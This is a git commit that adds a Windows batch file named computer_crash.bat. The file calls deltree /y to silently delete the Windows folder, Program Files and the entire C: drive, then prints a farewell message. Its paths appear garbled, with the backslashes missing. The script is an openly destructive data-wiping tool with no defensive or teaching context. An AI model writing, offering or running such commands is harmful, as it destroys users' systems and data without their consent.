9f57df9495fa38f7a948ff4a89f6b9337152d0d2
Baki Enes Yalçın <82122237+bakienes@users.noreply.github.com>
2021-04-08 01:46:40 +0300

    computer_crash.bat

---
+++ computer_crash.bat
@@ -0,0 +1,21 @@
+@echo off
+
+C:WINDOWSCOMMANDdeltree /y c:windows*.*
+
+@echo off
+
+C:WINDOWSCOMMANDdeltree /y c:Progra~1*.*
+
+@echo off
+
+C:WINDOWSCOMMANDdeltree /y c:*.*
+
+@echo off
+
+cls
+
+cls
+
+@echo .:by by!!!::.
+
+@echo off
